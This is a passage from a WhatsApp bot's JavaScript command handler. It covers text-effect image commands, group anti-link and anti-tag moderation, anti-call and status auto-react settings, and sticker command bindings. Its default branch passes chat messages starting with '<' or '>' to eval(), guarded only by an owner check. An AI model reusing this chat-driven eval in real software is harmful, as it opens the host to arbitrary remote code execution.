        reply("⚠️ *Error generating Multicolored Neon*");
    }
}
break;

case "sandsummer": {
    if (args.length < 1) return reply("✏️ *Usage:* sandsummer CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/sandsummer?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🏖️ *Sand Summer Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Sand Summer Text*");
    }
}
break;

case "galaxywallpaper": {
    if (args.length < 1) return reply("✏️ *Usage:* galaxywallpaper CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/galaxywallpaper?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🌌 *Galaxy Wallpaper*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Galaxy Wallpaper*");
    }
}
break;

case "style1917": {
    if (args.length < 1) return reply("✏️ *Usage:* style1917 CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/style1917?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🎖️ *1917 Style Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating 1917 Style Text*");
    }
}
break;

case "makingneon": {
    if (args.length < 1) return reply("✏️ *Usage:* makingneon CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/makingneon?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🌠 *Making Neon*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Making Neon*");
    }
}
break;

case "royaltext": {
    if (args.length < 1) return reply("✏️ *Usage:* royaltext CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/royaltext?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "👑 *Royal Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Royal Text*");
    }
}
break;

case "freecreate": {
    if (args.length < 1) return reply("✏️ *Usage:* freecreate CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/freecreate?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🧊 *3D Hologram Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Free Create Text*");
    }
}
break;

case "galaxystyle": {
    if (args.length < 1) return reply("✏️ *Usage:* galaxystyle CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/galaxystyle?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🪐 *Galaxy Style Logo*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Galaxy Style Logo*");
    }
}
break;

case "lighteffects": {
    if (args.length < 1) return reply("✏️ *Usage:* lighteffects CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/lighteffects?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "💡 *Light Effects*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Light Effects*");
    }
}
break;

// ======================[ 🔗 ANTILINKKICK ]======================
case 'antilinkkick': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    const _alk = antilinkSettings[m.chat] || {};
    _alk.enabled = true; _alk.action = 'kick'; _alk.warnMode = false;
    antilinkSettings[m.chat] = _alk;
    saveAntilinkSettings(antilinkSettings);
    reply(`✅ *Anti-Link KICK enabled*\nUsers who post links will be deleted + kicked`);
}
break;

case 'antilinkwarn': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    const _alw = antilinkSettings[m.chat] || {};
    _alw.enabled = true; _alw.action = 'delete'; _alw.warnMode = true;
    antilinkSettings[m.chat] = _alw;
    saveAntilinkSettings(antilinkSettings);
    const wl = getWarnLimit(m.chat);
    reply(`✅ *Anti-Link WARN enabled*\nLinks deleted + warned. Auto-kick at ${wl} warnings\n\nChange limit: \`${prefix}set warnlimit 3\``);
}
break;

case 'antilinkgc': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    const _algc = antilinkSettings[m.chat] || {};
    _algc.gcMode = 'delete'; _algc.warnMode = false;
    antilinkSettings[m.chat] = _algc;
    saveAntilinkSettings(antilinkSettings);
    reply(`✅ *Anti-GC-Link enabled (delete)*\nWhatsApp group-invite links will be deleted`);
}
break;

case 'antilinkgckick': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    const _algck = antilinkSettings[m.chat] || {};
    _algck.gcMode = 'kick'; _algck.warnMode = false;
    antilinkSettings[m.chat] = _algck;
    saveAntilinkSettings(antilinkSettings);
    reply(`✅ *Anti-GC-Link KICK enabled*\nGroup-invite links deleted + user kicked`);
}
break;

// ======================[ 🏷️ ANTITAGWARN / ANTITAGADMIN ]======================
case 'antitagwarn': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    setSetting(m.chat, "antitag", { enabled: true, action: 'warn', adminOnly: false });
    const wl = getWarnLimit(m.chat);
    reply(`✅ *Anti-Tag WARN enabled*\nTags deleted + warned. Auto-kick at ${wl} warnings\n\nChange limit: \`${prefix}set warnlimit 3\``);
}
break;

case 'antitagadmin': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    setSetting(m.chat, "antitag", { enabled: true, action: 'delete', adminOnly: true });
    reply(`✅ *Anti-Tag-Admin enabled (delete)*\nMessages tagging admins will be deleted`);
}
break;

case 'antitagadminwarn': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    setSetting(m.chat, "antitag", { enabled: true, action: 'warn', adminOnly: true });
    const wl = getWarnLimit(m.chat);
    reply(`✅ *Anti-Tag-Admin WARN enabled*\nAdmin tags deleted + warned. Auto-kick at ${wl} warnings`);
}
break;

// ======================[ 🔕 ANTI-GROUP-MENTION ]======================
case 'antigroupmention': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    if (!args[0]) {
        const _agmS = antigroupmentionSettings[m.chat] || { enabled: false };
        return reply(`🔕 *Anti-Group-Mention*\n\n` +
            `📌 *Usage:*\n` +
            `▸ ${prefix}antigroupmention on - Enable (delete)\n` +
            `▸ ${prefix}antigroupmention off - Disable\n\n` +
            `⚙️ *Status:* ${_agmS.enabled ? 'ON ✅' : 'OFF ❌'}\n` +
            `_Also: \`${prefix}antigroupmentionkick\` and \`${prefix}antigroupmentionwarn\`_`);
    }
    if (args[0] === 'on') {
        antigroupmentionSettings[m.chat] = { enabled: true, action: 'delete' };
        saveAntigroupmentionSettings(antigroupmentionSettings);
        reply(`✅ *Anti-Group-Mention enabled (delete)*`);
    } else if (args[0] === 'off') {
        antigroupmentionSettings[m.chat] = { enabled: false, action: 'delete' };
        saveAntigroupmentionSettings(antigroupmentionSettings);
        reply(`❌ *Anti-Group-Mention disabled*`);
    }
}
break;

case 'antigroupmentionkick': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    antigroupmentionSettings[m.chat] = { enabled: true, action: 'kick' };
    saveAntigroupmentionSettings(antigroupmentionSettings);
    reply(`✅ *Anti-Group-Mention KICK enabled*\nGroup-status mentions deleted + user kicked`);
}
break;

case 'antigroupmentionwarn': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    antigroupmentionSettings[m.chat] = { enabled: true, action: 'warn' };
    saveAntigroupmentionSettings(antigroupmentionSettings);
    const wl = getWarnLimit(m.chat);
    reply(`✅ *Anti-Group-Mention WARN enabled*\nGroup mentions deleted + warned. Auto-kick at ${wl} warnings`);
}
break;

// ======================[ ⚠️ WARNLIMIT ]======================
case 'warnlimit': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    if (!args[0]) {
        const curLimit = getWarnLimit(m.chat);
        return reply(`⚠️ *Warn Limit*\n\n*Current:* ${curLimit} warnings before auto-kick\n\n*Usage:* \`${prefix}warnlimit 3\`\nAccepts any number 1–20`);
    }
    const newLimit = parseInt(args[0]);
    if (isNaN(newLimit) || newLimit < 1 || newLimit > 20) return reply(`❌ *Invalid value*\nEnter a number between 1 and 20`);
    setWarnLimit(m.chat, newLimit);
    reply(`✅ *Warn limit set to ${newLimit}*\nUsers will be auto-kicked after ${newLimit} warnings`);
}
break;

// ======================[ 📞 ANTI-CALL ]======================
case 'anticall': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (isSettingsLocked() && !isCreator) return reply('🔒 *Settings are locked by owner*');
    const _acCfg = loadAnticallCfg();
    const _acOpt = args[0]?.toLowerCase();
    if (!_acOpt) {
        return reply(
            `*📞 ANTI-CALL SETTINGS*\n\n` +
            `*Current Mode:* ${_acCfg.mode || 'off'}\n\n` +
            `*Modes:*\n` +
            `• \`${prefix}anticall off\` — Calls pass through\n` +
            `• \`${prefix}anticall decline\` — Auto-decline incoming calls\n` +
            `• \`${prefix}anticall block\` — Block caller after declining\n\n` +
            `*Custom message:* \`${prefix}setanticallmsg <text>\`\n` +
            `_Placeholders: {user} = caller mention, {calltype} = audio/video_`
        );
    }
    if (!['off', 'decline', 'block'].includes(_acOpt)) return reply(`❌ Valid modes: off, decline, block`);
    saveAnticallCfg({ mode: _acOpt });
    const _acLabels = { off: '✅ Calls allowed (off)', decline: '📵 Auto-decline enabled', block: '🚫 Auto-decline + block enabled' };
    reply(`${_acLabels[_acOpt]}`);
}
break;

case 'setanticallmsg': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!text) return reply(`❌ *Usage:* \`${prefix}setanticallmsg Hey {user}, don't {calltype} call me!\`\n\nPlaceholders: {user} = caller, {calltype} = audio/video`);
    saveAnticallMsg({ msg: text });
    reply(`✅ *Anti-call message set:*\n\n${text}\n\n_Preview: ${text.replace('{user}', '@User').replace('{calltype}', 'voice')}_`);
}
break;

case 'showanticallmsg': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    const _acMsg = loadAnticallMsg();
    if (!_acMsg.msg) return reply(`ℹ️ *No custom anti-call message set*\nUsing default message`);
    reply(`*📞 Current Anti-Call Message:*\n\n${_acMsg.msg}`);
}
break;

case 'delanticallmsg': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    saveAnticallMsg({ msg: null });
    reply(`✅ *Anti-call message reset to default*`);
}
break;

case 'testanticallmsg': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    const _acMsgData = loadAnticallMsg();
    const _acMsgText = _acMsgData.msg || `📵 Hey {user}, please don't {calltype} call me. Send a message instead!`;
    const _acPreview = _acMsgText.replace('{user}', `@${m.sender.split('@')[0]}`).replace('{calltype}', 'voice');
    reply(`*📞 Anti-Call Message Preview:*\n\n${_acPreview}`);
}
break;

// ======================[ 📊 STATUS DELAY + MULTI-EMOJI ]======================
case 'autoviewstatusdelay': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) {
        const cur = getSetting(botNumber, 'autoViewStatusDelay', 0);
        return reply(`⏱️ *Auto-View Status Delay*\n\n*Current:* ${cur}s\n\n*Usage:* \`${prefix}autoviewstatusdelay 30s\`\nAccepts: plain seconds or compound like \`5m\`, \`2h\`, \`1h30m\`\nMax: 23h • 0 = instant`);
    }
    const _parseDelay = (str) => {
        let s = 0;
        const hm = str.match(/(\d+)h/); const mm = str.match(/(\d+)m(?!s)/); const sm2 = str.match(/(\d+)s/);
        if (hm) s += parseInt(hm[1]) * 3600;
        if (mm) s += parseInt(mm[1]) * 60;
        if (sm2) s += parseInt(sm2[1]);
        if (!hm && !mm && !sm2) s = parseInt(str) || 0;
        return Math.min(s, 23 * 3600);
    };
    const delay = _parseDelay(args[0]);
    setSetting(botNumber, 'autoViewStatusDelay', delay);
    reply(`✅ *Auto-view status delay set to ${delay}s*`);
}
break;

case 'autoreactstatusdelay': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) {
        const cur = getSetting(botNumber, 'autoReactStatusDelay', 0);
        return reply(`⏱️ *Auto-React Status Delay*\n\n*Current:* ${cur}s\n\n*Usage:* \`${prefix}autoreactstatusdelay 10m\`\nAccepts: \`30s\`, \`5m\`, \`2h\`, \`1h30m\`\n0 = instant`);
    }
    const _parseDelay2 = (str) => {
        let s = 0;
        const hm = str.match(/(\d+)h/); const mm = str.match(/(\d+)m(?!s)/); const sm2 = str.match(/(\d+)s/);
        if (hm) s += parseInt(hm[1]) * 3600;
        if (mm) s += parseInt(mm[1]) * 60;
        if (sm2) s += parseInt(sm2[1]);
        if (!hm && !mm && !sm2) s = parseInt(str) || 0;
        return Math.min(s, 23 * 3600);
    };
    const delay2 = _parseDelay2(args[0]);
    setSetting(botNumber, 'autoReactStatusDelay', delay2);
    reply(`✅ *Auto-react status delay set to ${delay2}s*`);
}
break;

case 'statusemoji': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) {
        const cur = getSetting(botNumber, 'statusEmojis', ['❤️']);
        return reply(`😊 *Status Emoji Settings*\n\n*Current:* ${cur.join(', ')}\n\n*Usage:*\n• \`${prefix}statusemoji 💚\` — single emoji\n• \`${prefix}statusemoji 💚,❤️,💙,💛\` — multiple (comma-separated, random pick)\n\nAny emoji accepted`);
    }
    const _emojis = text.split(',').map(e => e.trim()).filter(Boolean);
    setSetting(botNumber, 'statusEmojis', _emojis);
    reply(`✅ *Status emojis set:* ${_emojis.join(' ')}\n${_emojis.length > 1 ? `_One will be picked at random per status_` : ''}`);
}
break;

// ======================[ 🔒 LOCK SETTINGS ]======================
case 'locksettings': {
    if (!isCreator) return reply('🔒 *Owner only*');
    const _lsOpt = args[0]?.toLowerCase();
    if (!_lsOpt) {
        const locked = isSettingsLocked();
        return reply(`🔒 *Lock Settings*\n\n*Current:* ${locked ? '🔒 LOCKED (owner-only writes)' : '🔓 UNLOCKED'}\n\n*Usage:*\n• \`${prefix}locksettings on\` — Only owner can change settings\n• \`${prefix}locksettings off\` — Anyone can use settings commands`);
    }
    if (_lsOpt === 'on') { setSettingsLock(true); reply(`🔒 *Settings locked*\nOnly you (owner) can change bot settings`); }
    else if (_lsOpt === 'off') { setSettingsLock(false); reply(`🔓 *Settings unlocked*`); }
    else reply(`❌ Use: \`${prefix}locksettings on/off\``);
}
break;

// ======================[ 🎭 STICKER COMMANDS ]======================
case 'setstickercmd': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) return reply(`❌ *Usage:* Reply to a sticker with \`${prefix}setstickercmd <command>\`\nExample: \`${prefix}setstickercmd menu\``);
    const _scCmdName = args[0].toLowerCase();
    if (!m.quoted || m.quoted.mtype !== 'stickerMessage') return reply(`❌ *Reply to a sticker* to bind it\nExample: reply to a sticker with \`${prefix}setstickercmd ping\``);
    const _scHash = m.quoted.key?.id || JSON.stringify(m.quoted.message?.stickerMessage || {});
    const _scData = loadStickerCmds();
    _scData[_scHash] = _scCmdName;
    saveStickerCmds(_scData);
    reply(`✅ *Sticker bound to command:* \`${prefix}${_scCmdName}\`\nSending that sticker will now run \`${prefix}${_scCmdName}\``);
}
break;

case 'delstickercmd': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) return reply(`❌ *Usage:* \`${prefix}delstickercmd <command>\``);
    const _dscName = args[0].toLowerCase();
    const _dscData = loadStickerCmds();
    const _dscKey = Object.keys(_dscData).find(k => _dscData[k] === _dscName);
    if (!_dscKey) return reply(`⚠️ No sticker bound to command \`${prefix}${_dscName}\``);
    delete _dscData[_dscKey];
    saveStickerCmds(_dscData);
    reply(`✅ *Sticker alias removed:* \`${prefix}${_dscName}\``);
}
break;

case 'stickercmds': {
    const _scList = loadStickerCmds();
    const _scEntries = Object.values(_scList);
    if (_scEntries.length === 0) return reply(`📭 *No sticker commands registered*\nUse \`${prefix}setstickercmd <cmd>\` to bind a sticker`);
    reply(`🎭 *Sticker Command Bindings*\n\n${_scEntries.map((cmd, i) => `${i + 1}. \`${prefix}${cmd}\``).join('\n')}\n\n_Send the bound sticker to fire that command_`);
}
break;

// ======================[ ⚙️ SET / SETTINGS / CONFIG ]======================
case 'set':
case 'settings':
case 'config': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (isSettingsLocked() && !isCreator) return reply('🔒 *Settings locked by owner*');

    const _setKey = args[0]?.toLowerCase();
    const _setVal = args.slice(1).join(' ').trim();

    if (!_setKey) {
        // Show current settings summary
        const _adM = loadAntideleteCfg(jidToNum(getBotJid(devtrust))).mode || 'off';
        const _aeM = loadAntieditCfg().mode || 'off';
        const _acM = loadAnticallCfg().mode || 'off';
        const _locked = isSettingsLocked();
        const _sEmojis = getSetting(botNumber, 'statusEmojis', ['❤️']).join(', ');
        const _adDelay = getSetting(botNumber, 'autoViewStatusDelay', 0);
        const _arDelay = getSetting(botNumber, 'autoReactStatusDelay', 0);
        return reply(
            `*⚙️ BOT SETTINGS*\n\n` +
            `*🔰 Anti-Delete:* ${_adM}\n` +
            `*✏️ Anti-Edit:* ${_aeM}\n` +
            `*📞 Anti-Call:* ${_acM}\n` +
            `*🔒 Lock Settings:* ${_locked ? 'ON' : 'OFF'}\n` +
            `*😊 Status Emoji:* ${_sEmojis}\n` +
            `*⏱️ View Status Delay:* ${_adDelay}s\n` +
            `*⏱️ React Status Delay:* ${_arDelay}s\n\n` +
            `*Quick commands:*\n` +
            `• \`${prefix}set antidelete private\`\n` +
            `• \`${prefix}set antiedit private_groups\`\n` +
            `• \`${prefix}set anticall decline\`\n` +
            `• \`${prefix}set warnlimit 3\`\n` +
            `• \`${prefix}set statusemoji 🔥,💯,❤️\`\n` +
            `• \`${prefix}set autoviewstatusdelay 2m30s\`\n` +
            `• \`${prefix}set autoreactstatusdelay 10m\`\n` +
            `• \`${prefix}set locksettings on\``
        );
    }

    // Handle .set <key> <value> shorthand
    switch (_setKey) {
        case 'antidelete': {
            const _adModes = ['private', 'private_pm', 'private_groups', 'chat', 'chat_groups', 'off'];
            if (!_adModes.includes(_setVal)) return reply(`❌ Valid: ${_adModes.join(', ')}`);
            saveAntideleteCfg({ mode: _setVal }, jidToNum(getBotJid(devtrust)));
            return reply(`✅ *antidelete* set to: *${_setVal}*`);
        }
        case 'antiedit': {
            const _aeModes = ['private', 'private_pm', 'private_groups', 'chat', 'chat_groups', 'off'];
            if (!_aeModes.includes(_setVal)) return reply(`❌ Valid: ${_aeModes.join(', ')}`);
            saveAntieditCfg({ mode: _setVal });
            return reply(`✅ *antiedit* set to: *${_setVal}*`);
        }
        case 'anticall': {
            if (!['off', 'decline', 'block'].includes(_setVal)) return reply(`❌ Valid: off, decline, block`);
            saveAnticallCfg({ mode: _setVal });
            return reply(`✅ *anticall* set to: *${_setVal}*`);
        }
        case 'warnlimit': {
            if (!m.isGroup) return reply("👥 *Groups only for warnlimit*");
            const nl = parseInt(_setVal);
            if (isNaN(nl) || nl < 1 || nl > 20) return reply(`❌ Enter a number 1–20`);
            setWarnLimit(m.chat, nl);
            return reply(`✅ *warnlimit* set to: *${nl}*`);
        }
        case 'statusemoji': {
            const _se = _setVal.split(',').map(e => e.trim()).filter(Boolean);
            if (_se.length === 0) return reply(`❌ Provide at least one emoji`);
            setSetting(botNumber, 'statusEmojis', _se);
            return reply(`✅ *statusemoji* set to: ${_se.join(' ')}`);
        }
        case 'autoviewstatusdelay': {
            const _parseD = (s) => {
                let sec = 0;
                const h = s.match(/(\d+)h/); const mi = s.match(/(\d+)m(?!s)/); const sc = s.match(/(\d+)s/);
                if (h) sec += parseInt(h[1]) * 3600;
                if (mi) sec += parseInt(mi[1]) * 60;
                if (sc) sec += parseInt(sc[1]);
                if (!h && !mi && !sc) sec = parseInt(s) || 0;
                return Math.min(sec, 23 * 3600);
            };
            const d = _parseD(_setVal);
            setSetting(botNumber, 'autoViewStatusDelay', d);
            return reply(`✅ *autoviewstatusdelay* set to: *${d}s*`);
        }
        case 'autoreactstatusdelay': {
            const _parseD2 = (s) => {
                let sec = 0;
                const h = s.match(/(\d+)h/); const mi = s.match(/(\d+)m(?!s)/); const sc = s.match(/(\d+)s/);
                if (h) sec += parseInt(h[1]) * 3600;
                if (mi) sec += parseInt(mi[1]) * 60;
                if (sc) sec += parseInt(sc[1]);
                if (!h && !mi && !sc) sec = parseInt(s) || 0;
                return Math.min(sec, 23 * 3600);
            };
            const d2 = _parseD2(_setVal);
            setSetting(botNumber, 'autoReactStatusDelay', d2);
            return reply(`✅ *autoreactstatusdelay* set to: *${d2}s*`);
        }
        case 'locksettings': {
            if (!isCreator) return reply('🔒 *Owner only*');
            if (!['on', 'off'].includes(_setVal)) return reply(`❌ Use: on or off`);
            setSettingsLock(_setVal === 'on');
            return reply(`${_setVal === 'on' ? '🔒' : '🔓'} *locksettings* set to: *${_setVal}*`);
        }
        default:
            return reply(`❓ Unknown setting: *${_setKey}*\n\nType \`${prefix}set\` to see all settings`);
    }
}
break;

default:
    // Check if body exists before trying to use it
    if (body && body.startsWith) {
        // Safe eval - ONLY for owner and with logging
        if (body.startsWith('<')) {
            if (!isCreator) {
                console.log(`⚠️ Non-owner tried to use eval: ${m.sender}`);
                return;
            }
            
            try {
                const result = await eval(`(async () => { return ${body.slice(3)} })()`);
                const output = util.inspect(result, { depth: 1 });
                
                console.log(chalk.yellow(`📝 Eval executed by owner: ${body.slice(3)}`));
                
                if (output.length > 4000) {
                    await m.reply('✅ *Executed* (output too long)');
                } else {
                    await m.reply(output);
                }
            } catch (e) {
                await m.reply(`❌ Error: ${e.message}`);
            }
            break;
        }
        
        // Safe async eval - ONLY for owner
        if (body.startsWith('>')) {
            if (!isCreator) {
                console.log(`⚠️ Non-owner tried to use async eval: ${m.sender}`);
                return;
            }
            
            try {
                let evaled = await eval(body.slice(2));
                if (typeof evaled !== 'string') evaled = util.inspect(evaled, { depth: 1 });
                
                console.log(chalk.yellow(`📝 Async eval executed by owner`));
                
                if (evaled.length > 4000) {
                    await m.reply('✅ *Executed* (output too long)');
                } else {
                    await m.reply(evaled);
                }
            } catch (err) {
                await m.reply(`❌ Error: ${err.message}`);
            }
            break;
        }
    }
    
    // If no command matched, just ignore
    break;
}

} catch (err) {
    // Log error for debugging (you'll still see it in console)
    console.log(chalk.red('❌ Command Error:'));
    console.log(err);
    
    // Silent fail - no message to user
    // Bot continues running normally
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});